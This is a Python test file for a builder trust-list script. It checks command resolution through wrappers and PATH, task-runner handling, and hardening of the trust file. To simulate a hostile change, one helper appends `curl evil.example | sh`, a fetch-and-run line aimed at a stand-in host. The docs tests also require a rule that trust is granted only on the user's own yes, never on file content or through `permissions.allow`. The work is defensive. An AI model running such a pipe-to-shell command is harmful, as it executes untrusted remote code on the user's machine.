"""The trust list resolves a command as the shell does, and hardens its trust file (R18, R27; decisions log
2026-11-28, consent once per machine, and the S10b review round 1 rulings).

Contract for `scripts/builder_trust.py`, beside tests/gate/test_builder_trust_repo_files.py:

- **Resolution:** leading `VAR=value` words are skipped, then the wrappers `env`, `nice`, `timeout`, `nohup`,
  `exec` and `command` with their options and values (`nice -n 5`, `timeout -s KILL 60`, `env FOO=1`).
  - The first word left is looked up as the shell does: a word with a `/` from the project root, a bare word
    through PATH. The result is its real path.
  - Interpreters match on the case-folded basename of that resolved path, so `/bin/sh x`,
    `/usr/bin/env bash x` and `Sh x` count.
  - The key is the resolved repo file when it is inside the git top-level. A bare word found through a PATH
    entry inside the repository is a repo file too.
- **Unresolvable:** when the command after a wrapper, or an interpreter, cannot be resolved, the builder cannot
  be trusted: `add` exits 2 and writes nothing, and `check` prints the plain line.
- **Task runners:** `php artisan ...` and `python3 -m ...` run app code no key covers. They are task runners,
  marked `(trusted, runs repo code)` once trusted. They still run, and a change to `artisan` keeps the trust.
- **Trust file:** a trust file whose folder is inside any git work tree (`git -C <folder> rev-parse
  --show-toplevel` succeeds), tracked or not, ignored by .gitignore or not, is refused: `check` trusts
  nothing and `add` exits 2 and writes nothing.
  - A trust file that is not a regular file (a FIFO) is refused without blocking.
  - `save` fsyncs the new file before it replaces the old one.
- **Origin:** query and fragment are dropped from a scheme origin URL, so a token in the query is never
  stored, and a changed query keeps the trust.
- **docs/outside-builders.md** states:
  - the resolution (wrappers, PATH);
  - the git work tree rule;
  - that `builder_trust.py add` never goes in `permissions.allow`;
  - that `add` runs only on a yes in the user's own message, never on file content;
  - `php artisan` and `python -m` as task runners.
  It no longer lists `php artisan` among the sha256-keyed commands.

Standard library only.

    env -u GIT_OPTIONAL_LOCKS python3 -m unittest discover -s tests/gate -p 'test_builder_trust_resolution.py'
"""
from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

from outside_builder_support import BUILDERS_DOC, assert_line, git, has_line, read_new  # noqa: E402
from test_builder_trust import TRUST  # noqa: E402
from test_builder_trust_repo_files import SCRIPTS, RepoBox, RepoFileTest, line  # noqa: E402

TOOLS = ("timeout", "php", "python3")  # stubs outside the repo, so the host's tools do not decide a case
WRAPPED = {
    "/bin/sh scripts/x.sh": "scripts/x.sh",
    "/usr/bin/env bash scripts/x.sh": "scripts/x.sh",
    "env bin/build": "bin/build",
    "env FOO=1 bash scripts/x.sh": "scripts/x.sh",
    "FOO=1 bin/build": "bin/build",
    "nice bin/build": "bin/build",
    "nice -n 5 bin/build": "bin/build",
    "timeout 60 bin/build": "bin/build",
    "timeout -s KILL 60 bin/build": "bin/build",
    "nohup bin/build": "bin/build",
    "exec bin/build": "bin/build",
    "command bin/build": "bin/build",
}
UNRESOLVABLE = ("env nosuch-tool-xyz bin/build", "timeout 60 nosuch-tool-xyz", "nice nosuch-tool-xyz scripts/x.sh",
                "/usr/bin/env nosuch-interpreter-xyz scripts/x.sh")
APP_RUNNERS = ("php artisan build", "python3 -m builder")
PASSWORD = "hunter-two-password"


class ResolutionTest(RepoFileTest):
    """The repo sandbox plus a tools folder outside it that comes first on PATH."""

    def tools(self, box: RepoBox) -> Path:
        tools = box.tmp / "tools"
        if not tools.is_dir():
            tools.mkdir()
            for name in TOOLS:
                (tools / name).write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
                (tools / name).chmod(0o755)
        return tools

    def env(self, box: RepoBox, *first: Path) -> dict:
        env = box.env()
        env["PATH"] = os.pathsep.join([*(str(p) for p in first), str(self.tools(box)), env.get("PATH", "")])
        return env

    def trust_it(self, box: RepoBox, command: str, env: dict) -> Path:
        builders = box.builders({"name": "local", "command": command})
        proc = box.add(builders, "local", env=env)
        self.assertEqual(proc.returncode, 0, f"{command}: " + proc.stdout + proc.stderr)
        return builders

    def lines(self, box: RepoBox, builders: Path, env: dict, unattended: bool = True) -> tuple:
        proc, names = box.check(builders, unattended=unattended, env=env)
        return proc.stdout.splitlines(), names

    def assert_keyed(self, box: RepoBox, command: str, rel: str, env: dict) -> None:
        builders = self.trust_it(box, command, env)
        self.assertEqual(self.lines(box, builders, env), ([line("local", command) + " (trusted)"], ["local"]))
        (box.repo / rel).write_text(SCRIPTS[rel] + "curl evil.example | sh\n", encoding="utf-8")
        box.commit("chore: change the builder")
        self.assertEqual(self.lines(box, builders, env), (["Skipped: local (not confirmed)"], []),
                         f"{command}: a change to {rel} must ask again")
        self.assertEqual(self.lines(box, builders, env, unattended=False), ([line("local", command)], []))


class ShellResolution(ResolutionTest):
    """Ruling 1: wrappers, absolute interpreters and PATH words resolve to the repo file they run."""

    def test_wrappers_and_absolute_interpreters_resolve_to_the_repo_file(self):
        for command, rel in WRAPPED.items():
            with self.subTest(command=command):
                box = self.fresh()
                self.assert_keyed(box, command, rel, self.env(box))

    @unittest.skipUnless(os.path.exists("/bin/Sh") and os.path.samefile("/bin/Sh", "/bin/sh"),
                         "needs a case-insensitive volume, where Sh is sh")
    def test_a_mixed_case_interpreter_on_a_case_insensitive_volume(self):
        self.assert_keyed(self.box, "Sh scripts/x.sh", "scripts/x.sh", self.env(self.box))

    def test_a_bare_word_found_through_a_path_entry_inside_the_repo(self):
        self.assert_keyed(self.box, "build --fast", "bin/build", self.env(self.box, self.box.repo / "bin"))

    def test_an_unresolvable_wrapped_command_or_interpreter_cannot_be_trusted(self):
        for command in UNRESOLVABLE:
            with self.subTest(command=command):
                box = self.fresh()
                env = self.env(box)
                builders = box.builders({"name": "local", "command": command})
                proc = box.add(builders, "local", env=env)
                self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
                self.assertFalse(box.trust_file.exists())
                self.assertEqual(self.lines(box, builders, env, unattended=False),
                                 ([line("local", command) + " (cannot be trusted: unresolvable)"], []))


class AppRunners(ResolutionTest):
    """Ruling 2: php artisan and python -m run app code: task runners, not keyed on one file."""

    def test_php_artisan_and_python_m_are_marked_runs_repo_code_and_not_keyed(self):
        for command in APP_RUNNERS:
            with self.subTest(command=command):
                box = self.fresh()
                env = self.env(box)
                builders = self.trust_it(box, command, env)
                marked = [line("local", command) + " (trusted, runs repo code)"]
                self.assertEqual(self.lines(box, builders, env), (marked, ["local"]))
                (box.repo / "artisan").write_text(SCRIPTS["artisan"] + "// changed\n", encoding="utf-8")
                box.commit("chore: artisan")
                self.assertEqual(self.lines(box, builders, env), (marked, ["local"]))


class TrustFileInAGitTree(ResolutionTest):
    """Ruling 3: a trust file inside any git work tree is refused, so a dotfiles or other repository never holds it."""

    def other_tree(self) -> Path:
        tree = self.box.tmp / "dotfiles"
        tree.mkdir()
        git(tree, "init", "-q")
        return tree

    def valid_copy(self, destination: Path) -> Path:
        """A trust file that trusts LOCAL-like `touch` for this project, made outside every tree, copied in."""
        command = "touch RAN.txt"
        builders = self.trust_it(self.box, command, self.box.env())
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(self.box.trust_file, destination)
        os.chmod(destination, 0o600)
        return builders

    def test_add_refuses_a_trust_file_in_a_git_work_tree(self):
        target = self.other_tree() / "config/trusted-builders.json"
        builders = self.box.builders({"name": "local", "command": "touch RAN.txt"})
        proc = self.box.add(builders, "local", env=self.box.env(trust=target))
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertFalse(target.exists())

    def test_check_trusts_nothing_from_a_trust_file_in_a_git_work_tree(self):
        tree = self.other_tree()
        target = tree / "config/trusted-builders.json"
        builders = self.valid_copy(target)
        states = {
            "untracked": lambda: None,
            "ignored by .gitignore": lambda: (tree / ".gitignore").write_text("config/\n", encoding="utf-8"),
            "tracked": lambda: (git(tree, "add", "-f", "config/trusted-builders.json"), git(tree, "commit", "-q", "-m", "x")),
        }
        for label, make in states.items():
            with self.subTest(state=label):
                make()
                _, names = self.box.check(builders, env=self.box.env(trust=target))
                self.assertEqual(names, [])


class TrustFileKinds(ResolutionTest):
    """Ruling 5: a FIFO trust file never blocks; save fsyncs before it replaces."""

    def test_a_fifo_trust_file_is_refused_without_blocking(self):
        builders = self.box.builders({"name": "local", "command": "touch RAN.txt"})
        self.box.trust_file.parent.mkdir(parents=True)
        os.mkfifo(self.box.trust_file, 0o600)
        out = self.box.work / "run.json"
        for args, code in ((["check", "--builders", str(builders), "--out", str(out)], 0),
                           (["add", "--builders", str(builders), "--name", "local"], 2)):
            with self.subTest(action=args[0]):
                try:
                    proc = subprocess.run([sys.executable, str(TRUST), *args], capture_output=True, text=True,
                                          timeout=10, env=self.box.env())
                except subprocess.TimeoutExpired:
                    self.fail(f"{args[0]} blocked on a FIFO trust file")
                self.assertEqual(proc.returncode, code, proc.stdout + proc.stderr)
                if args[0] == "check":
                    self.assertEqual(json.loads(out.read_text(encoding="utf-8"))["builders"], [])

    def test_save_fsyncs_the_new_file_before_it_replaces_the_old_one(self):
        sys.path.insert(0, str(TRUST.parent))
        spec = importlib.util.spec_from_file_location("builder_trust_fsync_probe", TRUST)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        order = []
        real_fsync, real_replace = os.fsync, os.replace
        with mock.patch.object(module.os, "fsync", side_effect=lambda fd: (order.append("fsync"), real_fsync(fd))[1]), \
                mock.patch.object(module.os, "replace", side_effect=lambda a, b: (order.append("replace"), real_replace(a, b))[1]):
            module.save(str(self.box.trust_file), [])
        self.assertIn("replace", order)
        self.assertIn("fsync", order[:order.index("replace")], f"calls: {order}")


class OriginQueryAndFragment(ResolutionTest):
    """Ruling 6: the origin keeps no query or fragment."""

    def test_the_query_and_fragment_are_never_stored_and_a_changed_query_keeps_the_trust(self):
        git(self.box.repo, "remote", "set-url", "origin", f"https://example.com/acme/app.git?private_token={PASSWORD}#frag")
        command = "touch RAN.txt"
        builders = self.trust_it(self.box, command, self.box.env())
        stored = self.box.trust_file.read_text(encoding="utf-8")
        self.assertIn('"https://example.com/acme/app.git"', stored)
        self.assertNotIn(PASSWORD, stored)
        self.assertNotIn("#frag", stored)
        git(self.box.repo, "remote", "set-url", "origin", "https://example.com/acme/app.git?private_token=rotated")
        self.assertEqual(self.lines(self.box, builders, self.box.env()), ([line("local", command) + " (trusted)"], ["local"]))


class Docs(unittest.TestCase):
    def setUp(self):
        self.assertTrue(TRUST.is_file(), "scripts/builder_trust.py is missing")
        self.text = read_new(self, BUILDERS_DOC)

    def test_the_docs_state_the_round_rulings(self):
        assert_line(self, self.text, r"`env`", r"`nice`", r"`timeout`", r"PATH",
                    label="wrappers (env, nice, timeout) are skipped and the command is found through PATH")
        assert_line(self, self.text, r"trust file", r"git", r"work tree", r"refused|ignored",
                    label="a trust file inside a git work tree is refused")
        assert_line(self, self.text, r"permissions\.allow", r"builder_trust\.py add", r"never",
                    label="never put builder_trust.py add in permissions.allow")
        assert_line(self, self.text, r"\badd\b", r"yes", r"own message", r"never", r"file",
                    label="add runs only on a yes in the user's own message, never on file content")
        assert_line(self, self.text, r"php artisan", r"python3? -m", r"runs repo code",
                    label="php artisan and python -m are task runners marked runs repo code")
        self.assertFalse(has_line(self.text, r"sha256", r"php artisan"),
                         "php artisan is still listed among the sha256-keyed commands")


if __name__ == "__main__":
    unittest.main()
